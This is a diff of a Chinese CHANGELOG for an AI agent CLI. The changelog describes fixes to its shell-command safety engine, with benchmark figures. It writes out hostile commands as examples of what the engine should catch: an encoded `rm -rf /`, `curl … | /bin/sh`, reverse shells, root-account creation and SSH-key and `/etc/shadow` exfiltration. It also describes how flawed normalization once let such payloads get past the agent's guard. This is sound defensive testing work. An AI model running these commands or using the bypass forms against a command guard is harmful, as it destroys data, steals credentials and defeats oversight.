@@ -9,6 +9,23 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - **一月一大更新**: 主版本号 `+0.1` (如 0.3.x → 0.4.0), 承载新模块/架构级改动。
 - **每周一小更新**: 补丁号 `+0.0.1` (如 0.3.1 → 0.3.2), 承载修复/小功能/依赖治理。
 
+## [0.3.3] - 2026-10-26 (体验增强 · feat/experience-20261026)
+### Tuan-Chat 桌面端 (Tuan/)
+- **启动流程重塑 (T-1)**: 冷启动 BootSplash（Logo 动效 + init→connect→ready 三阶段清单 + 进度条，`?skipBoot=1` 跳过）；Onboarding 向导改为 3 步（选 Provider → 填 API Key → 选模式），可跳过、可随时重开（设置 → 重新打开引导，即时弹出）。
+- **Ctrl+K 命令面板 (T-4)**: 拼音首字母模糊匹配、最近 5 条置顶、Tab 补全、导出会话 MD / 删除当前 / 清空全部动作；完成/失败/待确认桌面通知（仅后台弹）。
+- **设置与外观 (T-2/T-7)**: 设置页 5 分组（外观/模型/安全/通知/实验）；暗/亮/跟随系统三态即时切换；3 主题（暗/亮/护眼绿）+ 4 强调色 + 3 字体档 + 3 款 ASCII 吉祥物；严格模式在模式页禁用「无界」。
+- **会话管理 (T-3)**: 侧栏最近 20 条截断、标题+内容搜索、删除二次确认、触屏左滑删/右滑新建/下拉刷新；MD/JSON 单条与全部导出、清空全部二次确认；离线徽章。
+- **PWA 与移动端 (T-6)**: Service Worker 注册 + 「安装到桌面/主屏幕」入口。
+### Tuan-CLI (tuan_cli/)
+- **C-1 首次运行向导**: `tuan setup` 三步向导（6 家 provider → getpass 不回显 → 5 模式默认协同），`setup --skip` / `TUAN_SKIP_SETUP=1` 跳过，首次运行自动触发。
+- **C-2 错误体验**: 5 类 FriendlyError 分类 + 顶层兜底隐藏 traceback（`--debug` 才显示）。
+- **C-4 会话恢复**: 顶层 `--continue` / `--resume <id>` 旗标；`tuan sessions list/rm`；`Agent.load_history()` 收敛上下文恢复。
+- **C-5 离线优先**: `core/network_check.py::is_offline(3s)`；ModelRouter 离线自动降级本地模型、在线自动切回；响应 TTL 1h 缓存。
+- **TUI Tab 补全增强 (C-3)**: 模糊匹配（前缀>子串>子序列）、多级子命令补全、参数预览、帮助行、历史优先、Windows 字形降级；离线横幅提示。
+### Web 后端与 Rust 引擎
+- `tuan_cli/web/server.py`: `/api/settings` GET/POST 落盘（web_settings.json）、`/api/sessions` DELETE 无参=删全部、预算告警（默认 80% 阈值）、remote_control 模块级 `notify()`、内嵌 UI 触控手势 + 离线横幅；新增回归测试 `tests/test_web_experience_slice.py`。
+- `Tuan/src-tauri`: engine-stage / engine-notify / engine-error 事件 + 会话恢复 Tauri commands。
+
 ## [0.3.2] - 2026-10-25 (小更新)
 ### 新增: 4 个独有模块 (多数 Agent 尚无对应物)
 
@@ -50,6 +67,153 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   防止开发中/隐私文件 (例如代办 md) 被提交;
 - 新增 `.tuanignore` 运行时规则, 与引擎 Privacy Shield 联动;
 - 核查确认: 父仓库与 Tuan 仓库均无待办/隐私文件入库 (仅 `.env.example` 模板与代码)。
+
+### 安全: 6 项引擎缺陷修复 + 基准复测 (对抗 10k 误杀 23 → 1)
+
+复测前实测 (2026-10-25, seed 20260906) 与 README 声称数字不符: 拦截召回 99.95%、
+绕过 4、误杀 17。逐项排查后确认 README 的「100% / 0 绕过」是**过期数字**, 不是引擎达标。
+
+- **修复: normalizer 有损改写造成 2 处反向 shell 漏放**。规范化阶段会剥离空白/引号,
+  但剥离位置不当导致 `python -c 'import socket...'` / `perl -e 'use Socket...'` 类载荷
+  的边界判断失效 —— 载荷被判为普通脚本调用。修正剥离顺序后两类 REV_SHELL 恢复 100% 拦截。
+- **修复: base64 + 命令替换漏放 (6 处)**。`$(echo cm0gLXJmIC8= | base64 -d)` 这类载荷
+  整条 `risk=none` 放行。根因是 `_normalize` 剥掉 `$(` 前缀时把 `echo` 一并吃掉,
+  `_ECHO_B64_PIPE_RE` 匹配失败, `_is_base64_pipeline_dangerous` 两个分支全灭。
+  bash 5.3 实测证明命令替换在**命令位置**真的执行 (`$ $(echo "echo X")` 把 X 当程序跑),
+  所以这确实是真攻击而非误杀。改为「含 base64 解码即先尝试解码, 解出红线即判危险」,
+  不再依赖 shell 形态是否成立。连带修好 `bash -c "$(echo <b64> | base64 -d)"`
+  (解码内容直接作解释器参数) 这一族共 6 种形态。D.编码绕过 新增 12 条变体锁回归。
+- **修复: `--force-with-lease` 被硬红线误判为不可逆破坏**。`git push --force-with-lease`
+  是带保护的强推, 语义上比 `--force` 安全, 却与后者共用一条红线触发硬拦。拆分为独立规则
+  → 降为 flag (单次确认), 消除与 `git push --force` 的自相矛盾。
+- **修复: `nc` 端口探测 Unicode 变体 11 条误杀**。`nc` 后的 `-z` / `-zv` 被写成
+  U+2010/2011/2012/2013/2014/2015/2212/FE63/FE64/FE65/FF0D 时未识别为选项, 整条命令被
+  网络守卫拦下。补齐 `_NC_DASH_MAP` 后 `nc -zv host 22` 类良性探测恢复放行。
+- **修复: `>/var/log` 写日志的过度升级**。原先把「写入 /var/log」当高危数据销毁,
+  实际是普通日志追加。归入 `_MEDIUM_PATTERNS`, 不再触发高危路径。
+- **修复: `kill -9 <pid>` 与广播式 `pkill -9` 未分级**。定向 `kill -9 1234` 降为 medium;
+  但 `pkill -9 nginx` / `killall -9 node` (按名称强制终止全部同名进程) 与
+  `kill -9 0|1` (整进程组 / init) 保留 high —— 首次下移时曾误把 `pkill -9 nginx`
+  一并放成 medium 造成 1 条真回归, 已用独立 high 规则补回。
+
+复测结果 (同 seed, 同命令): 拦截召回 **100%**、标记召回 **100%**、
+误杀 **1 (0.09%)**、**绕过 0**; PS 5k 正确率 100% / 漏放 0 / 误杀 0;
+绕过矩阵 2321 → 绕过 0 / 误杀 1 / 灾难类别 100% 拦截。
+剩余 2 条误杀全部是 flag (单次确认), **三套基准无一条硬拦误杀**, 均为有意保守升级
+(`tar | ssh` 类外泄形态、`export X; cmd` 环境变量链)。
+
+### 安全: 真实使用场景基准 (随机种子) + 7 项修复
+
+上一节的修复全部基于固定种子语料 —— 那只能证明「这套题我会做」。本次改用
+**真正随机种子 + 良性主导的真实使用语料**重测, 暴露出四类此前不可见的问题。
+
+新增 `bench/realistic_usage_bench.py`: 15 个命令族生成器 (git / 文件操作 / 搜索 /
+Python / Node / 容器 / 构建 / 环境变量 / 链式 / 管道 / 重定向 / sudo / 网络 /
+模糊 / 危险 / 须确认), 全部词汇表随机化, `--seed0` 缺省时用 `SystemRandom` 真随机。
+与固定种子的对抗矩阵互补: 对抗矩阵问「攻击是否被挡」, 本基准问「开发者每天跑 65 条
+命令时会不会遇到 1 次误拦」—— 1% 硬拦误杀率意味着平均每 65 条命令就被拦 1 次。
+
+- **修复: glob 展开无长度上限 → 单条命令卡死 22 秒 (可复现 DoS)**。
+  `_expand_globs` 原本只限**匹配条数** (1000), 不限**展开后文本长度**。
+  `python3 -m pytest tests/test_*.py` 命中 290 个真实测试文件, 展开成 9273 字符,
+  后续 225 条正则全部在这段长串上扫描, 完整评估耗时 **22.19 秒**。攻击者只要让
+  Agent 分析一条带 glob 的日常命令即可卡死 Agent。新增 `_GLOB_MAX_TOTAL_CHARS = 1500`
+  按字符数截断并保留省略标记。单条命令 22.19s → 558ms, 整体 569ms/条 → 25ms/条。
+- **修复: 3 条灾难性回溯正则**。`tar over ssh` 用 `(?=[\s\S]*\btar\b[\s\S]*\|\s*ssh\b)`
+  嵌套前瞻, 复杂度随文本长度平方以上放大 —— 在 9273 字符上单条模式耗时 **1.03s**,
+  两条反向 shell 模式各 0.69s / 0.62s。改为 `[^\n]*` 行内语义, 并由 `_match_any`
+  **逐行扫描**覆盖多行载荷 (换行本就是 shell 命令分隔符), 语义不变、扫描范围受限。
+- **修复: 11 条 Linux 账户/权限提升命令全部 `risk=none` 放行**。随机基准反复漏放:
+  `useradd -m -u 0 hacker` (新建 uid=0 账户 = 提权为 root)、`groupadd/groupmod -g 0`、
+  `userdel -r` (不可逆销毁用户主目录)、`usermod -L root` / `passwd -l root`
+  (锁定 root 造成拒绝服务)、`chown -R root:root /home` 与 `chown -R nobody:nobody /*`
+  (递归接管系统目录所有权)、`iptables -P INPUT DROP` (入站全部锁死)、
+  `ufw disable` / `ufw delete rule`。原红线只覆盖 `chown -R ... /` 恰好为根目录,
+  以及 `iptables -P ... ACCEPT`, 漏了 DROP 与所有子目录。新增 11 条 critical 规则;
+  另新增 3 条 high 规则覆盖 `systemctl stop|disable|mask sshd|ssh|openssh-server`、
+  `service sshd stop` 与 `usermod -s /usr/sbin/nologin` (远程访问锁死, 有控制台可
+  恢复故列 high 而非 critical)。系统目录匹配要求目录名后紧跟行尾或「/ + 空白」,
+  避免误伤 `chown -R www-data:www-data /var/www/html` 这类常规 web 部署。
+- **修复: `chmod 600 ~/.ssh/config` 被硬拦**。分类器 `accesses_ssh_keys` (+65 直接顶到
+  deny) 只排除了 `ssh-keygen` 只读查询, 没排除权限与元数据操作。`chmod`/`chown`/
+  `chgrp`/`stat`/`ls` 不搬运密钥内容, `chmod 600` 甚至是收紧权限的安全加固动作。
+  加入操作排除后 9 类权限管理命令恢复放行, `cat ~/.ssh/id_rsa` / `scp` / `cp` /
+  `rsync` / `base64` / `curl -d @` 等 10 种搬运形态仍全部照拦。
+  **此处引入一次回归, 已当场修掉**: 首版排除用 `^(?:sudo\s+)?(?:chmod|...)` 锚在命令
+  开头, 被 `true; chmod ...` / `cd /tmp && chmod ...` / `export X=1; chmod ...` 这类
+  前缀绕过, 对抗 10k (seed 20260906) 误杀从 1 条涨到 13 条。改为按「含 `.ssh/` 的那一段」
+  判断, 剥掉 `sudo`/`nohup`/`env`/`VAR=val` 前缀并解一层 `bash -c '...'` 子 shell 后再
+  比对动词。修复后该种子 5 条误杀 (全为既有 `tar|ssh` 良性用例及其前缀变体),
+  0 硬拦误杀; 18 种前缀化的密钥搬运变体仍全部照拦, 0 漏放。
+- **修复: `userdel --remove` 漏放**。短选项规则未覆盖长选项形态, 补齐。
+- **性能: 正则缓存 + 惰性 import**。cProfile 显示 `re._compile` 被调 482,987 次 / 1.178s
+  (225 条模式字符串每次 `_match_any` 都重新编译), 函数体内 `from ...blacklist_override
+  import is_suppressed` 被调 320,365 次 / 1.570s。新增模块级 `_PATTERN_CACHE` +
+  `_compiled()` 与惰性 `_get_suppressed_fn()`, 并把 `_label_suppressed` 内的
+  `re.compile` 提到模块级 `_AUTH_FILE_RE`。
+- **修复: `tuan safe bench` 子进程捕获在 Windows 上抛 `UnicodeDecodeError`**。
+  5 处 `subprocess.run(..., text=True)` 未指定编码, 子进程输出含非 GBK 字节时
+  后台读线程直接崩 (`'gbk' codec can't decode byte 0xad`)。补 `errors="replace"`。
+- **新增矩阵 AO 类别 (80 条载荷锁回归)**: `AO.账户提权` (24, block)、
+  `AO.防火墙与远程锁死` (7, block)、`AO.停用SSH须确认` (12, flag)、
+  `AO.账户与权限-良性` (43, allow)。分类前缀用 AO —— AN 已被程序化等义变体组占用。
+- **`tuan safe bench` 接入第四套 (真实使用基准)**, 并新增 `danger_miss_silent_total`
+  指标: 危险命令被完全 allow (无任何提示) 的条数。这是唯一真正不可接受的指标 ——
+  flag 还留有最后一道人工防线, allow 没有。基准汇总多打一行
+  `静默放行: N 条 [PASS/FAIL]`。
+
+基准对比 (4 个独立随机种子 × 1500 条 = 6000 条, 种子基 631363909):
+
+| 指标 | 修复前 (3 种子) | 修复后 (4 种子) |
+|---|---|---|
+| 硬拦误杀占良性比例 | 1.16% – 1.78% | **0.230% – 0.315%** |
+| 真危险命令召回 | 60.0% – 76.0% (中位 71.4%) | **90.0% – 100.0% (中位 93.6%)** |
+| 完整评估延迟 | 114.6 ms/条 (含单条 22s 卡顿) | **中位 15.4 ms/条** |
+| 静默放行 | 未度量 | **0 条** |
+
+**关键结论: 7 条剩余「漏拦」全部是 `flag` (单次确认), 没有一条被静默放行。**
+`history -c` / `chmod 777 /` / `chmod 777 -R /home` / `systemctl stop sshd` 属可确认
+恢复类, 与 `rm -rf /` / `mkfs` / 反向 shell 不同档。而 14 条硬拦误杀 **100% 来自
+同一个钉死的策略决定**: `ssh user@host 'cmd'` → `net:deny`
+(`tests/test_security_network_ownership.py` 断言 `deny_remote_exec=True`)。
+这不是缺陷, 但意味着日常 `ssh deploy@host 'uptime'` 会被硬拦 —— 需要产品决策:
+保留硬拦, 还是降为单次确认。
+
+对抗语料回归 (seed `20260906`, 与存档同种子): 拦截召回 **100%**、漏放 **0**、
+误杀 **5 (0.45%)**, **全部为 flag, 0 条硬拦误杀**; 绕过矩阵 2497 条载荷,
+**绕过 0**, 全部灾难类别 100% 拦截。账户权限双向探针: 42/42 良性零误拦,
+25/25 高危零漏放; 密钥搬运 18 种前缀变体零漏放。
+
+### 修复: `_yaml.py` 真实崩溃 + 差分测试假阴性
+
+- **修复: 保留词作 YAML 键时崩溃**。`yes:` / `no:` / `on:` / `off:` / `true:` / `false:`
+  作键时, 键被二次类型推断成 `bool`/`None`, 后续 `.strip()` 抛
+  `AttributeError: 'bool' object has no attribute 'strip'` —— 配置文件里出现 `yes: 1`
+  就能让配置加载直接崩。根因是 `_split_key` 用 `_unquote` 且带 `or ""` falsy 陷阱
+  (`False or ""` → 空串键)。新增 `_unquote_key` (只解引号不推断), 键一律字符串,
+  跟随 YAML 1.2 核心 schema。
+- **修复: 与父键同缩进的序列被静默解析成 `None`**。
+  `a:\n- 1\n- 2\n` 是合法 YAML (`{'a': [1, 2]}`), 旧实现只查 `indent+1`, 静默返回
+  `{'a': None}` —— 数据丢失且不报错。新增 `_parse_child` 仅在下一行确为 `- ` 时
+  按同缩进续收序列, 同缩进映射仍判非法。
+- **新增 `tests/test_yaml_shim.py` (43 用例)**。修掉了此前一个**假阴性漏洞**:
+  `_yaml.py` 末尾在后端选择时把 `safe_load` 重绑定到 PyYAML, 于是拿 `safe_load`
+  做差分基准等于让 PyYAML 跟自己比 —— 装 PyYAML 时永远绿灯。旧文档指向
+  `.scratch/test_yaml_shim.py` (gitignored, 不可复现)。新测试锁定 `_stdlib_safe_load`,
+  并用 `test_shim_alias_is_not_pyyaml` 自证别名未被重绑定。
+
+### 修复: 基准标签差点被「修好」
+
+排查误杀时发现 D.编码绕过里的
+
+```
+$(echo cm0gLXJmIC8= | base64 -d)      `echo cm0gLXJmIC8= | base64 -d`
+```
+
+疑为引擎误杀并一度移入良性类。用 bash 5.3 实测否证: 命令替换在**命令位置**会执行
+(`$ $(echo "echo DECODED")` 真的把 DECODED 当程序跑了), 只有被引号包着作 `echo` 参数时
+才是纯文本。已还原标签并留档 —— 这类载荷是真实攻击, 引擎判 block 正确。
+教训与复现脚本见 `bench/README.md`「一条容易被忽略的教训」一节。
 
 ## [Unreleased] - 2026-10-18
 ### 新增: 免费层扩充 (商汤日日新公测免费 + 4 家完全免费) + 供应商/模型清单校准
@@ -431,6 +595,57 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   非滚轮事件不翻页(含直接验绑定层只认 SCROLL_*)/ `TUAN_NO_MOUSE` /
   提示文案含滚轮。相关回归 **358 项全绿**。
 
+### 新增: 跨平台可移植性套件 + 8 项跨平台缺陷修复
+
+**背景**: 全部基准 (10k 对抗 / 5k PowerShell / 2497 绕过矩阵 / 6000 真实使用)
+此前只在 **Windows** 上实测, Linux/macOS 从未运行。这带来一个诚实性问题:
+不能在文档里声称「Linux/macOS 也安全」。新增第 5 套件给出在缺少多平台 runner
+前提下能拿到的最强证据。
+
+- **`tests/test_platform_portability.py` (274 载荷)** — 在**本机**跑 POSIX / Linux /
+  macOS 载荷 (`/etc/shadow`、`~/.ssh/id_rsa`、`/dev/tcp` 反向 shell、Linux 账户提权、
+  macOS `csrutil`/`kextload`/`security`)，断言判定符合预期；另含两个**结构性**检查：
+  检测层 (`SafetyEngine`/`SecurityClassifier`/`NetworkGuard`/红线/模式库) 不得引用
+  `os.path`/`ntpath`/`platform.system`/`os.name`，唯一碰文件系统的分支是
+  `safety_normalize._resolve_symlinks`。原理：检测层是纯字符串正则，同一份正则 +
+  同一个 `re` 引擎 + 同样的输入字符串，在 Linux 上的判定必然一致。
+- **`tuan safe bench` 接入第 5 套件** (1/5…5/5 重编号)，存档新增 `platform` 字段
+  (`system`/`release`/`machine`/`python`/`os_name`)，控制台打印本平台，
+  避免把单平台结果当成「全平台已验证」引用。
+- **CI 固化**：`.github/workflows/security-ci.yml` 新增可移植性步骤，并注明
+  `safety-benchmarks` job 跑在 `ubuntu-latest` 上 —— 三套确定性基准每次 push 实际在
+  **Linux** 执行，仍须通过同一门禁对比 Windows 存档，即跨平台一致性是被门禁强制的，
+  不是被假设的。
+
+#### 该套件一次性暴露的 8 项真实缺陷 (此前全部 `risk=none` 放行或误拦)
+
+| # | 缺陷 | 修复 |
+|---|---|---|
+| 1 | `curl http://x \| /bin/sh` 全放行 —— 模式要求 `\|` 后紧跟 shell 名，**中间不允许路径前缀**，`/bin/sh`、`/bin/bash`、`/usr/bin/zsh` 整类绕过 | 允许任意路径前缀，补全 `sh/bash/zsh/ksh/dash/ash/fish/es/tcsh/csh` + `powershell/pwsh/cmd` + `python/perl/ruby/node/php`；另加 `env`/`xargs`/`nohup` 间接寻址规则 |
+| 2 | `stat /etc/passwd`、`less /etc/passwd` 被硬拦 —— `/etc/shadow\|passwd` 特征不看动词，纯提及即 +65 顶到 deny | 新增「读 vs 搬运」区分：只读动词 (`cat/less/head/tail/grep/stat/ls/wc/find`…) 豁免 |
+| 3 | **上一步我自己引入的回归**：`chmod 777 /etc/shadow`、`chown evil:evil /etc/shadow` 变放行 —— 把 chmod/chown 放进只读豁免，等于把密码文件改成全局可读 | 拆出 `_READONLY_VERBS_STRICT` (不含 chmod/chown/chgrp) 专供认证文件；`~/.ssh` 密钥仍用宽列表，因为那里的 chmod 多半是收紧权限 |
+| 4 | `awk {print} ~/.ssh/id_rsa > /tmp/x` 放行 —— `awk` 被当只读豁免，但重定向就是外泄 | 红线读凭证动词表补全 `awk/sed/grep/tee/sort/uniq/cut/tr/paste/join/xargs/wc/…`；只读豁免额外要求无重定向/管道/拷贝类动作 (`_EXFIL_HINT_RE`) |
+| 5 | `env FOO=1 chown root ~/.ssh/config` 被硬拦 —— 重构 helper 时把 `env` 从前缀正则里漏掉了 | `_EXEC_PREFIX_RE` 补回 `env`，另加 `timeout` |
+| 6 | `fdisk -l /dev/sda`、`sgdisk -p /dev/sda` 被硬拦 —— 只读查询当成分区改写 | 分区工具规则加只读参数负向前瞻 (`-l`/`--list`/`-p`/`--print`/`print`/`-v`/`--verify`) |
+| 7 | `security show-keychain`、`list-keychains`、`unlock-keychain` 被顶到 deny —— 特征只匹配字符串 "keychain"，不区分查询与写入 | 新增 `_is_keychain_query` 豁免 (`security show/list/find/dump/unlock/set-attr/read`)；`import` 与 `delete/remove-certificate` 仍由专门红线负责 |
+| 8 | macOS 缺口：`csrutil disable`、`kextload /tmp/*.kext`、`security import evil.cer`、`defaults write /Library/...`、`mv /System/Library`、`chown -R /System` 全放行 | 新增 8 条 macOS 规则 (SIP 关闭 / 临时目录加载 kext / 证书导入删除 / 系统级 defaults / 系统卷移动改权)；`chown -R` 系统目录表补 `System`/`Library` |
+
+另新增**只读查询良性对照** (`fdisk -l`、`sgdisk -p`、`parted print`、`csrutil status`、
+`security find-*`、`diskutil list`、`defaults write com.apple.Safari …`、`kextstat` 等
+40 条)，防止为了堵漏把常规运维命令一起拦掉。
+
+**回归确认 (全部绿)**：平台可移植性 **274/274**；安全回归探针 **ALL PASS**；
+账户权限双向 **42/42 良性零误拦 + 25/25 高危零漏放**；子 shell 解包 **8/8**；
+SSH 权限 vs 外泄 **18/18 高危零漏放**（唯一残留 `find ~/.ssh -type f` → flag，
+`find -delete/-exec rm` 是真实滥用面，保守可接受）；YAML 差分 **43 passed**；
+绕过矩阵 **2497 载荷 / 绕过 0 / 误杀 1 / 灾难类别 100%**；对抗 10k (钉死 seed
+`20260906`) **拦截召回 100% / 漏放 0 / 误杀 5 (0.45%) 全 flag / 硬拦误杀 0 / 绕过 0**
+—— 与改动前完全一致，零回归。
+
+**仍存在的诚实边界**：本套件证明的是「检测判定跨平台一致」，**不**证明
+「Linux/macOS 端到端可用」。CLI 本身的平台适配（子进程创建、`/undo` 事务账本、
+`security-bench.json` 路径处理）在 Linux/macOS 上仍需实机跑一次才算数。
+
 ## [0.3.1] - 2026-10-12
 ### 仓库卫生 + 品牌归属整改 + 安全默认值加固
 
@@ -654,7 +869,7 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   也无法据此选择执行域。
 - 检测在既有引擎的 `_normalize` **归一化后**文本上进行（与红线判定同源，不给
   Base64/ANSI-C/解释器内联/全角等变体留绕过口子），不重复造检测。
-- **引擎判定作为综合分下限**：`SafetyEngine` 的模式库沉淀自 2310 条对抗载荷，
+- **引擎判定作为综合分下限**：`SafetyEngine` 的模式库沉淀自 2321 条对抗载荷，
   远比信号表全面；若只用加权均值，`rm -rf /` 这种"只命中一类但极危险"的命令
   会被结构性低估（单一维度顶格最多贡献 10×0.25=2.5）。实测标定：
   `ls`/`git status` 0.0 · `rm -rf ./build` 7.0 high · `cat ~/.ssh/id_rsa` 7.0 high ·
